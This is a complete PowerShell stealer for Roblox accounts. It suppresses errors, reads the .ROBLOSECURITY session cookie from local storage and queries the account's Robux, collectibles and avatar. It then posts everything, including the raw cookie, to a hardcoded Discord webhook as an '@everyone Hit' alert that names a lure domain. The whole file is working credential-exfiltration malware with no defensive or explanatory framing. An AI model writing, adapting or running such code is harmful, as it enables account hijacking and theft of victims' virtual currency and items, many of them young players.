$ErrorActionPreference = "SilentlyContinue"

$webhook = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
$domain = "dicerigx.app"

# 1. Extract Cookie
$cookie = ""
$paths = @("$env:LOCALAPPDATA\Roblox\LocalStorage\*.dat", "$env:LOCALAPPDATA\Roblox\LocalStorage\*.log")
foreach ($p in $paths) {
    $files = Get-ChildItem -Path $p -ErrorAction SilentlyContinue
    foreach ($f in $files) {
        $content = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
        if ($content -match '\.ROBLOSECURITY\s+(.+?)(?:;|\s|$)') {
            $cookie = $matches[1]
            break
        }
    }
    if ($cookie) { break }
}

if (-not $cookie) { exit }

# 2. API Lookups
$headers = @{ "Cookie" = ".ROBLOSECURITY=$cookie"; "User-Agent" = "Roblox/WinInet" }

$me = Invoke-RestMethod -Uri "https://users.roblox.com/v1/users/authenticated" -Headers $headers
$uid = $me.id
$name = $me.name
$display = $me.displayName

$prof = Invoke-RestMethod -Uri "https://users.roblox.com/v1/users/$uid" -Headers $headers
$created = $prof.created
$age = [math]::Floor(((Get-Date) - [datetime]$created).TotalDays)

$cur = Invoke-RestMethod -Uri "https://economy.roblox.com/v1/users/$uid/currency" -Headers $headers
$robux = $cur.robux

$collData = Invoke-RestMethod -Uri "https://inventory.roblox.com/v1/users/$uid/assets/collectibles?limit=100" -Headers $headers
$hasHeadless = $false
$hasKorblox = $false
$rap = 0
$owned = 0

if ($collData.data) {
    $owned = $collData.data.Count
    foreach ($item in $collData.data) {
        if ($item.assetId -eq 99657 -or $item.assetId -eq 134330133) { $hasHeadless = $true }
        if ($item.assetId -eq 139275807 -or $item.assetId -eq 192) { $hasKorblox = $true }
        $rap += [int]$item.recentAveragePrice
    }
}

$collStr = "False"
if ($hasHeadless -and $hasKorblox) { $collStr = "Headless ✅ | Korblox ✅" }
elseif ($hasHeadless) { $collStr = "Headless ✅ | Korblox ❌" }
elseif ($hasKorblox) { $collStr = "Headless ❌ | Korblox ✅" }

$avatarData = Invoke-RestMethod -Uri "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=$uid&size=420x420&format=Png" -Headers $headers
$avatar = $avatarData.data[0].imageUrl

# 3. Build Embed
$embed = @{
    content = "@everyone Hit"
    embeds = @(
        @{
            author = @{ name = "S3R, 13+"; icon_url = $avatar }
            description = "**+1 HIT** · You've Earned 1 Nevora · beams XP`n**Domain:** ``$domain``"
            color = 16711680
            fields = @(
                @{ name = "👤 User"; value = "**$display**"; inline = $false }
                @{ name = "⭐ Password"; value = "``````dreistuff``````"; inline = $false }
                @{ name = "About User"; value = "**Account Age:** $age Days`n**Location:** United States of America 🇺🇸"; inline = $false }
                @{ name = "🪙 Robux"; value = "**Balance:** $robux`n**Pending:** 0"; inline = $true }
                @{ name = "📈 RAP"; value = "**RAP:** $rap`n**Owned:** $owned"; inline = $true }
                @{ name = "💎 Premium"; value = "**False**"; inline = $true }
                @{ name = "💳 Billing"; value = "**Credit:** $0`n**Payments:** 0"; inline = $true }
                @{ name = "🏷️ Collectibles"; value = $collStr; inline = $true }
                @{ name = "⚙️ Settings"; value = "**Set (Verified):** Disabled`n**Disabled:** Disabled"; inline = $true }
                @{ name = "🎮 Passes / Played"; value = "Adopt Me ``0`` · **False**`nMurder Mystery 2 ``0`` · **True**`nPet Simulator 99 ``0`` · **False**"; inline = $true }
                @{ name = "👥 Groups"; value = "**Balance:** 0`n**Pending:** 0`n**Owned:** 0"; inline = $true }
            )
            footer = @{ text = ".ROBLOSECURITY" }
        }
    )
}

# 4. Append Raw Cookie
$cookieDisplay = "``````n$cookie`n``````"
$embed.embeds[0].fields += @{ name = "🔓 .ROBLOSECURITY"; value = $cookieDisplay; inline = $false }

# 5. Fire
$json = $embed | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json"
